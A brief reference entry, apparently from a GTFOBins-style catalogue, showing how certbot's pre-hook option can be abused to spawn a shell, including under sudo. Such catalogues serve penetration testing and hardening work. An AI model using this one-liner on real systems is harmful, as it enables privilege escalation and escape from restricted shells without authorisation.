---
type: gtfobin
name: certbot
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# certbot

## shell

```bash
certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0'
```
_This needs a writable directory, replace `.` if needed._
**Contexts:** sudo, unprivileged
